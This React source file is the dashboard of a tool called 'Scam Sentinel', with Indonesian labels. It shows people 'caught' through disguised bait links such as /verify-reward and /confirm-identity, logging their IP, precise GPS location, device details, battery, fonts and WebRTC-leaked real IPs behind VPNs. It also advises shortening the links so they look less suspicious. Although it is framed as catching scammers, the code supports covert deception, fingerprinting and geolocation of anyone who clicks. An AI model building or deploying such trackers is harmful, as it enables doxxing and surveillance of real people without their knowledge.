import React, { useState, useEffect } from 'react';
import { Shield, MapPin, Globe, Trash2, RefreshCcw, Wifi, WifiOff, ChevronDown, ChevronUp } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { supabase, isSupabaseConfigured } from '../utils/supabase';

// ── Expanded row detail ──────────────────────────────────────────────────────
const DetailRow = ({ label, value, color }) => (
  <div style={{ display: 'flex', justifyContent: 'space-between', padding: '6px 0', borderBottom: '1px solid rgba(255,255,255,0.05)' }}>
    <span style={{ color: 'var(--text-muted)', fontSize: '12px', minWidth: '140px' }}>{label}</span>
    <span style={{ fontSize: '12px', fontWeight: '600', color: color || 'white', textAlign: 'right', wordBreak: 'break-all' }}>{value || '—'}</span>
  </div>
);

const ExpandedDetail = ({ log }) => {
  const mapsUrl = log.precise_lat
    ? `https://maps.google.com/?q=${log.precise_lat},${log.precise_lng}`
    : `https://maps.google.com/?q=${log.latitude},${log.longitude}`;

  return (
    <motion.tr
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      <td colSpan="7" style={{ padding: '0 24px 20px', background: 'rgba(59,130,246,0.04)' }}>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '20px', paddingTop: '16px' }}>

          {/* Lokasi */}
          <div className="glass-card" style={{ padding: '16px' }}>
            <h4 style={{ color: '#3b82f6', fontSize: '12px', marginBottom: '10px', letterSpacing: '1px' }}>📍 LOKASI</h4>
            <DetailRow label="IP Address" value={log.ip} color="#3b82f6" />
            <DetailRow label="Kota" value={log.city} />
            <DetailRow label="Provinsi" value={log.region} />
            <DetailRow label="Negara" value={`${log.country_name} (${log.country_code})`} />
            <DetailRow label="Kode Pos" value={log.postal} />
            <DetailRow label="ISP / Operator" value={log.org} color="#f59e0b" />
            <DetailRow label="Koordinat IP" value={log.latitude ? `${log.latitude}, ${log.longitude}` : '—'} />
            {log.precise_lat && (
              <DetailRow label="GPS AKURAT" value={`${log.precise_lat}, ${log.precise_lng} (±${log.gps_accuracy})`} color="#10b981" />
            )}
            <div style={{ marginTop: '10px' }}>
              <a href={mapsUrl} target="_blank" rel="noreferrer"
                style={{ display: 'inline-block', padding: '6px 14px', background: log.precise_lat ? '#10b981' : '#ef4444', color: 'white', borderRadius: '6px', fontSize: '12px', fontWeight: '700', textDecoration: 'none' }}>
                {log.precise_lat ? '📌 Buka GPS Akurat' : '🗺️ Buka Lokasi IP'}
              </a>
            </div>
          </div>

          {/* Device */}
          <div className="glass-card" style={{ padding: '16px' }}>
            <h4 style={{ color: '#a855f7', fontSize: '12px', marginBottom: '10px', letterSpacing: '1px' }}>📱 IDENTITAS DEVICE</h4>
            <DetailRow label="Merek HP" value={log.brand} color="#a855f7" />
            <DetailRow label="Model" value={log.model} color="#a855f7" />
            <DetailRow label="Tipe Device" value={log.device_type} />
            <DetailRow label="Sistem Operasi" value={log.os} color="#f59e0b" />
            <DetailRow label="Browser" value={log.browser} />
            <DetailRow label="Platform" value={log.platform} />
            <DetailRow label="Bahasa" value={log.languages || log.language} />
            <DetailRow label="Touch Points" value={log.touch_points > 0 ? `${log.touch_points} titik` : 'Tidak ada (Mouse)'} />
          </div>

          {/* Hardware */}
          <div className="glass-card" style={{ padding: '16px' }}>
            <h4 style={{ color: '#10b981', fontSize: '12px', marginBottom: '10px', letterSpacing: '1px' }}>⚙️ HARDWARE</h4>
            <DetailRow label="CPU Cores" value={log.cores ? `${log.cores} Cores` : '—'} color="#10b981" />
            <DetailRow label="RAM" value={log.memory} color="#10b981" />
            <DetailRow label="GPU" value={log.gpu} />
            <DetailRow label="Resolusi Layar" value={log.screen_resolution} />
            <DetailRow label="Viewport" value={log.viewport} />
            <DetailRow label="Color Depth" value={log.color_depth ? `${log.color_depth}-bit` : '—'} />
            <DetailRow label="Pixel Ratio" value={log.pixel_ratio ? `${log.pixel_ratio}x` : '—'} />
            <DetailRow label="Baterai" value={log.battery} color={log.charging === 'Charging' ? '#10b981' : '#f59e0b'} />
            <DetailRow label="Status Charger" value={log.charging} color={log.charging === 'Charging' ? '#10b981' : '#f59e0b'} />
            <DetailRow label="Estimasi Baterai" value={log.battery_time} />
          </div>

          {/* Jaringan & Misc */}
          <div className="glass-card" style={{ padding: '16px' }}>
            <h4 style={{ color: '#ef4444', fontSize: '12px', marginBottom: '10px', letterSpacing: '1px' }}>📶 JARINGAN & LAINNYA</h4>
            <DetailRow label="Tipe Jaringan" value={log.network_type?.toUpperCase()} color="#ef4444" />
            <DetailRow label="Kecepatan" value={log.network_speed} />
            <DetailRow label="Latency (RTT)" value={log.network_rtt} />
            <DetailRow label="Timezone" value={log.timezone} />
            <DetailRow label="Referrer" value={log.referrer} />
            {log.webrtc_local_ips && (
              <DetailRow label="IP Lokal (WebRTC)" value={log.webrtc_local_ips} color="#f97316" />
            )}
            {log.webrtc_public_ips && (
              <DetailRow label="IP Asli / VPN Leak" value={log.webrtc_public_ips} color="#ef4444" />
            )}
            <DetailRow label="Cookies" value={log.cookies_enabled ? 'Aktif' : 'Diblokir'} />
            <DetailRow label="Do Not Track" value={log.do_not_track} />
            <DetailRow label="Font Terdeteksi" value={log.fonts} />
            <div style={{ marginTop: '10px', padding: '8px', background: 'rgba(0,0,0,0.3)', borderRadius: '6px' }}>
              <p style={{ fontSize: '10px', color: 'var(--text-muted)', marginBottom: '4px' }}>USER AGENT</p>
              <p style={{ fontSize: '10px', wordBreak: 'break-all', color: '#94a3b8' }}>{log.user_agent}</p>
            </div>
          </div>

        </div>
      </td>
    </motion.tr>
  );
};

// ── Main Dashboard ───────────────────────────────────────────────────────────
const Dashboard = () => {
  const [logs, setLogs] = useState([]);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [isOnline, setIsOnline] = useState(isSupabaseConfigured());
  const [expandedId, setExpandedId] = useState(null);
  const [currentBaitLink, setCurrentBaitLink] = useState('');

  // Link tetap — tidak berubah
  const BAIT_LINKS = [
    { label: 'Link Utama', url: `${window.location.origin}/verify-reward` },
    { label: 'Link Cadangan', url: `${window.location.origin}/confirm-identity` },
  ];

  useEffect(() => { setCurrentBaitLink(BAIT_LINKS[0].url); }, []);

  const loadLogs = async () => {
    setIsRefreshing(true);
    if (isSupabaseConfigured()) {
      const { data, error } = await supabase
        .from('scam_logs')
        .select('*')
        .order('timestamp', { ascending: false })
        .limit(200);
      if (!error && data) { setLogs(data); setIsOnline(true); }
      else { setIsOnline(false); setLogs(JSON.parse(localStorage.getItem('scam_logs') || '[]')); }
    } else {
      setIsOnline(false);
      setLogs(JSON.parse(localStorage.getItem('scam_logs') || '[]'));
    }
    setTimeout(() => setIsRefreshing(false), 600);
  };

  useEffect(() => {
    loadLogs();
    if (isSupabaseConfigured()) {
      const channel = supabase
        .channel('scam_logs_realtime')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'scam_logs' }, (payload) => {
          if (payload.eventType === 'INSERT') setLogs((p) => [payload.new, ...p]);
          else if (payload.eventType === 'UPDATE') setLogs((p) => p.map((l) => l.id === payload.new.id ? payload.new : l));
          else if (payload.eventType === 'DELETE') setLogs((p) => p.filter((l) => l.id !== payload.old.id));
        })
        .subscribe();
      return () => supabase.removeChannel(channel);
    }
  }, []);

  const clearLogs = async () => {
    if (!window.confirm('Hapus semua data?')) return;
    if (isSupabaseConfigured()) await supabase.from('scam_logs').delete().neq('id', 'x');
    localStorage.removeItem('scam_logs');
    setLogs([]);
  };

  const toggleExpand = (id) => setExpandedId((prev) => (prev === id ? null : id));

  return (
    <div className="container" style={{ padding: '40px 0' }}>
      <header style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '48px' }}>
        <div>
          <h1 style={{ fontSize: '32px', fontWeight: '900', display: 'flex', alignItems: 'center', gap: '12px' }}>
            <Shield size={36} color="#3b82f6" />
            SCAM <span style={{ color: '#3b82f6' }}>SENTINEL</span>
          </h1>
          <p style={{ color: 'var(--text-muted)', marginTop: '4px', display: 'flex', alignItems: 'center', gap: '8px' }}>
            {isOnline
              ? <><Wifi size={14} color="#10b981" /><span style={{ color: '#10b981' }}>Live — Supabase Real-time</span></>
              : <><WifiOff size={14} color="#ef4444" /><span style={{ color: '#ef4444' }}>Offline Mode</span></>}
          </p>
        </div>
        <div style={{ display: 'flex', gap: '12px' }}>
          <button className="btn-secondary" onClick={loadLogs} disabled={isRefreshing}>
            <RefreshCcw size={18} style={{ animation: isRefreshing ? 'spin 1s linear infinite' : 'none' }} />
          </button>
          <button className="btn-secondary" onClick={clearLogs} style={{ color: '#ef4444' }}>
            <Trash2 size={18} />
          </button>
        </div>
      </header>

      {/* Stats */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(180px, 1fr))', gap: '20px', marginBottom: '40px' }}>
        {[
          { label: 'TOTAL TERTANGKAP', value: logs.length, color: 'white' },
          { label: 'GPS AKURAT', value: logs.filter((l) => l.precise_lat).length, color: '#10b981' },
          { label: 'MOBILE', value: logs.filter((l) => l.device_type === 'Mobile').length, color: '#a855f7' },
          { label: 'LOKASI TERAKHIR', value: logs[0] ? `${logs[0].city}, ${logs[0].country_code}` : 'N/A', color: '#f59e0b' },
        ].map((s) => (
          <div key={s.label} className="glass-card" style={{ padding: '20px' }}>
            <h3 style={{ color: 'var(--text-muted)', fontSize: '11px', marginBottom: '8px', letterSpacing: '1px' }}>{s.label}</h3>
            <div style={{ fontSize: '28px', fontWeight: '800', color: s.color }}>{s.value}</div>
          </div>
        ))}
      </div>

      {/* Table */}
      <div className="glass-card" style={{ overflow: 'hidden' }}>
        <div style={{ padding: '20px 24px', borderBottom: '1px solid var(--border-color)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <h2 style={{ fontSize: '18px' }}>Penipu Tertangkap</h2>
          <span className="status-badge status-online">{isOnline ? '🟢 Real-time' : '🔴 Offline'}</span>
        </div>
        <div style={{ overflowX: 'auto' }}>
          <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left' }}>
            <thead>
              <tr style={{ background: 'rgba(255,255,255,0.02)', borderBottom: '1px solid var(--border-color)' }}>
                {['WAKTU', 'IP', 'LOKASI IP', 'DEVICE', 'OS & BROWSER', 'BATERAI', 'DETAIL'].map((h) => (
                  <th key={h} style={{ padding: '14px 20px', fontSize: '11px', color: 'var(--text-muted)', letterSpacing: '1px' }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              <AnimatePresence initial={false}>
                {logs.length === 0 ? (
                  <tr>
                    <td colSpan="7" style={{ padding: '60px', textAlign: 'center', color: 'var(--text-muted)' }}>
                      {isOnline ? 'Belum ada penipu yang terpancing.' : '⚠️ Supabase belum dikonfigurasi.'}
                    </td>
                  </tr>
                ) : (
                  logs.map((log) => (
                    <React.Fragment key={log.id}>
                      <motion.tr
                        initial={{ opacity: 0, x: -20 }}
                        animate={{ opacity: 1, x: 0 }}
                        style={{
                          borderBottom: '1px solid var(--border-color)',
                          cursor: 'pointer',
                          background: expandedId === log.id ? 'rgba(59,130,246,0.06)' : 'transparent',
                        }}
                        onClick={() => toggleExpand(log.id)}
                      >
                        <td style={{ padding: '14px 20px', fontSize: '12px' }}>
                          {new Date(log.timestamp).toLocaleString('id-ID')}
                        </td>
                        <td style={{ padding: '14px 20px', fontWeight: '700', color: '#3b82f6', fontSize: '13px' }}>{log.ip}</td>
                        <td style={{ padding: '14px 20px' }}>
                          <div style={{ fontSize: '13px' }}>{log.city}</div>
                          <div style={{ fontSize: '11px', color: 'var(--text-muted)' }}>{log.region}, {log.country_code}</div>
                          <div style={{ fontSize: '11px', color: '#f59e0b' }}>{log.org}</div>
                        </td>
                        <td style={{ padding: '14px 20px' }}>
                          <div style={{ fontSize: '13px', fontWeight: '600', color: '#a855f7' }}>{log.brand} {log.model}</div>
                          <div style={{ fontSize: '11px', color: 'var(--text-muted)' }}>{log.device_type} • {log.cores} Cores • {log.memory}</div>
                          <div style={{ fontSize: '11px', color: '#10b981' }}>{log.screen_resolution}</div>
                        </td>
                        <td style={{ padding: '14px 20px' }}>
                          <div style={{ fontSize: '12px', color: '#f59e0b' }}>{log.os}</div>
                          <div style={{ fontSize: '11px', color: 'var(--text-muted)' }}>{log.browser}</div>
                          <div style={{ fontSize: '11px', color: '#64748b' }}>{log.network_type?.toUpperCase()} • {log.network_speed}</div>
                        </td>
                        <td style={{ padding: '14px 20px' }}>
                          <div style={{ fontSize: '13px', color: log.charging === 'Charging' ? '#10b981' : '#f59e0b' }}>
                            {log.charging === 'Charging' ? '🔌' : '🔋'} {log.battery}
                          </div>
                          <div style={{ fontSize: '11px', color: 'var(--text-muted)' }}>{log.battery_time}</div>
                          <div style={{ fontSize: '11px', color: log.precise_lat ? '#10b981' : '#ef4444' }}>
                            {log.precise_lat ? '📌 GPS Akurat' : '🌐 IP Only'}
                          </div>
                        </td>
                        <td style={{ padding: '14px 20px' }}>
                          <button
                            style={{ background: 'none', border: '1px solid var(--border-color)', borderRadius: '6px', padding: '6px 10px', color: 'white', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '4px', fontSize: '12px' }}
                            onClick={(e) => { e.stopPropagation(); toggleExpand(log.id); }}
                          >
                            {expandedId === log.id ? <ChevronUp size={14} /> : <ChevronDown size={14} />}
                            {expandedId === log.id ? 'Tutup' : 'Lihat'}
                          </button>
                        </td>
                      </motion.tr>
                      <AnimatePresence>
                        {expandedId === log.id && <ExpandedDetail key={`detail-${log.id}`} log={log} />}
                      </AnimatePresence>
                    </React.Fragment>
                  ))
                )}
              </AnimatePresence>
            </tbody>
          </table>
        </div>
      </div>

      {/* Link Tetap */}
      <div style={{ marginTop: '40px', padding: '32px' }} className="glass-card">
        <h3 style={{ marginBottom: '16px', display: 'flex', alignItems: 'center', gap: '10px' }}>
          <Globe size={20} color="#3b82f6" /> Link Jebakan (Tetap)
        </h3>
        <p style={{ color: 'var(--text-muted)', marginBottom: '20px', fontSize: '14px' }}>
          Link ini tidak berubah. Bisa dipersingkat pakai <strong>s.id</strong> atau <strong>bit.ly</strong> supaya tidak terlihat mencurigakan.
        </p>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
          {BAIT_LINKS.map((link) => (
            <div key={link.url} style={{ display: 'flex', gap: '12px', alignItems: 'center', flexWrap: 'wrap' }}>
              <span style={{ fontSize: '12px', color: 'var(--text-muted)', minWidth: '100px' }}>{link.label}</span>
              <input
                readOnly
                value={link.url}
                style={{
                  flex: 1, minWidth: '200px',
                  background: 'rgba(0,0,0,0.3)',
                  border: '1px solid var(--border-color)',
                  borderRadius: '8px', padding: '10px 12px',
                  color: 'white', fontFamily: 'monospace', fontSize: '13px',
                }}
              />
              <button
                className="btn-primary"
                style={{ whiteSpace: 'nowrap' }}
                onClick={() => { navigator.clipboard.writeText(link.url); alert(`${link.label} berhasil dicopy!`); }}
              >
                Copy
              </button>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

export default Dashboard;
